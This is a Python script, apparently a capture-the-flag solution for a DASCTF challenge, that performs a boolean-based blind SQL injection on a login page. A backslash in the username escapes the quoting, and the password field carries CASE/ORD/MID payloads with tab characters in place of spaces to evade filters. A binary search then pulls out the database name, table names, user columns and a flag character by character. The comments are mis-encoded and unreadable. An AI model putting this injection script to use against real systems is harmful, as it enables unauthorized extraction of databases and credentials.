import requests
flag = ''
url = "http://80.endpoint-937257753a42410f8b8e78ee52ca818a.m.ins.cloud.dasctf.com:81/login.php"

def check_char(i, mid):
    data = {'username':"\\",'password':"||"}
    #payload = f"||case\x09ord(mid(database()\x09from\x09{i}\x09for\x091))\x09when\x09{mid}\x09then\x091\x09else\x090\x09end%23"
    
    # ���ݿ���
    #payload = f"||case\x09when\x09ord(mid(database()\x09from\x09{i}\x09for\x091))<{mid}\x09then\x091\x09else\x090\x09end#"

    # ����
    #payload = f"||case\x09when\x09ord(mid((select\x09group_concat(table_name)\x09from\x09information_schema.tables\x09where\x09table_schema=0x646173637466)\x09from\x09{i}\x09for\x091))<{mid}\x09then\x091\x09else\x090\x09end#"
    
    # ����
    payload = f"||case\x09when\x09ord(mid((select\x09group_concat(column_name)\x09from\x09information_schema.columns\x09where\x09table_name=0x7573657273)\x09from\x09{i}\x09for\x091))<{mid}\x09then\x091\x09else\x090\x09end#"    
    
    # ����
    #payload = f"||case\x09when\x09ord(mid((select\x09group_concat(flag)\x09from\x09flagss)\x09from\x09{i}\x09for\x091))<{mid}\x09then\x091\x09else\x090\x09end#"
    data["password"] = payload
    #print(data)
    r = requests.post(url ,data=data)
    return "��¼�ɹ�" not in r.text
    #return "Username or password error!" in r.text


def find_char(i):
    low, high = 32, 127  # ����ɴ�ӡ�ַ���ASCII��Χ����32��126
    while low < high:     # ���ж��ֲ��ң�ֱ��low����С��high
        mid = (low + high) // 2  # �����м�ֵ
        if check_char(i, mid):  # ��鵱ǰ�м�ֵ��Ӧ���ַ��Ƿ���������
            low = mid + 1  # �������������˵��Ŀ���ַ������ڸ��ߵķ�Χ������low
        else:
            high = mid  # ���������������Ŀ���ַ��ڵ�ǰmid���£�����high
    return chr(low - 1)  # �����ҵ����ַ���low��ȥ1����Ϊ���һ��ѭ������ʱlow�ѳ�����Χ

def main():
    global flag
    for i in range(1, 40):  # ����������Ȳ�����40���ַ�
        char = find_char(i)
        #print(char)
        if char == chr(31):  # ������ص��ǿ����ַ���˵�������Ѿ�û�и����ַ���
            break
        flag += char
        print(f"Current content: ~{flag}~")
main()